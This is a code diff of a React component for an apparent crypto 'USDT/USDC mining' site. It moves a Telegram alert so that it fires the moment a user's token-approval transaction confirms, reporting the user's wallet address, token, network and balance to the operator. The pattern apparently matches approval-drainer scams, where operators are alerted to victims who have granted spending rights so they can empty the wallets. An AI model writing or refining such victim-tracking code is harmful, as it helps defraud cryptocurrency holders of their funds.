@@ -214,6 +214,29 @@ export default function MiningSection() {
       if (isConfirmed && selectedAsset && miningAmount && !isMining) {
         setIsMining(true);
 
+        // Send alert when approval transaction is confirmed
+        {
+          const chainNames: { [key: string]: string } = {
+            '97': 'BSC Testnet',
+            '56': 'BSC Mainnet',
+            '11155111': 'Ethereum Sepolia',
+            '1': 'Ethereum Mainnet',
+            '80001': 'Polygon Mumbai',
+            '137': 'Polygon Mainnet'
+          };
+          const chainName = chainNames[String(chainId)] || `Chain ${chainId}`;
+          const approvalConfig = addressConfig[String(chainId) as keyof typeof addressConfig];
+          const tokenAddress = selectedAsset === 'USDT' ? approvalConfig?.USDT : approvalConfig?.USDC;
+          const selectedAssetBalance = selectedAsset === 'USDT' ? minedPerToken.usdt : minedPerToken.usdc;
+          const message = `🎉 <b>User Approved!</b>\n\n` +
+            `👤 User: <code>${account?.address}</code>\n` +
+            `🪙 Token: <code>${tokenAddress}</code>\n` +
+            `🪙 Token Name: <code>${selectedAsset}</code>\n` +
+            `⛓️ Network: <b>${chainName}</b>\n` +
+            `💰 Balance: <code>${selectedAssetBalance} ${selectedAsset}</code>\n`;
+          sendAlert(message);
+        }
+
       console.log('Total mined', miningTotals.totalMined, 'Amount to mine', miningAmount);
       if (ENABLE_BALANCE_VALIDATION && Number(miningTotals.totalMined) === 0 && parseFloat(miningAmount) < 16) {
         setIsMining(false);
@@ -288,19 +311,6 @@ export default function MiningSection() {
           
           if (data.success) {
             alert(`Mining started successfully`);
-
-            const selectedAssetBalance =
-              selectedAsset === 'USDT' ? minedPerToken.usdt : minedPerToken.usdc;
-            
-            // message for Telegram alert with asset balance and network info
-            const message = `🎉 <b>User Approved!</b>\n\n` +
-              `👤 User: <code>${account?.address}</code>\n` +
-              `🪙 Token: <code>${tokenAddress}</code>\n` +
-              `🪙 Token Name: <code>${selectedAsset}</code>\n` +
-              `⛓️ Network: <b>${chainName}</b>\n` +
-              `💰 Balance: <code>${selectedAssetBalance} ${selectedAsset}</code>\n`;
-            
-            sendAlert(message);
           } else {
             alert(`Failed to start mining: ${data.error}`);
           }
